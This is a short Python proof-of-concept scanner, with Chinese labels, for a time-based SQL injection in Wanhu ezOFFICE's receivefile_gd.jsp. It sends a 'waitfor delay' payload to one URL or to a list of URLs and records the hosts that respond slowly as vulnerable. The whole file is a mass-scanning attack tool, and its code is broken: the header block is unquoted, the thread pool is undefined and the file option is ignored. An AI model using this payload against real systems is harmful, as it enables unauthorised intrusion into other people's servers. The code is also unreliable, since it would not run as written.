#app="万户ezOFFICE协同管理平台"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
def main():
    parse=argparse.ArgumentParser(description='万户 ezOFFICE receivefile_gd.jsp SQL注入漏洞')
    parse.add_argument('-u',dest='url',type=str,help='请输入一个url')
    parse.add_argument('-f',dest='file',type=str,help='请输入一个文件名')
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist=[]
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                urllist.append(i.strip())
            pool=pool(10)
            pool.map(poc,urllist)
            pool.close()
            pool.join()
    else:
        pass

def poc(target):
    headers={
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close}
    payload="/defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:8'--+-"
    try:
        res1=requests.get(url=target,verify=False,timeout=10,headers=headers)
        res2=requests.get(url=target+payload,verify=False,timeout=10,headers=headers)
        time1=res1.elapsed.total_seconds()
        time2=res2.elapsed.total_seconds()
        if time2 - time1 > 8:
            print(f"{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8')as result:
                result.write(target+"\n")
        else:
            pass
    except Exception as e:
        pass
if __name__=='__main__':
    main()


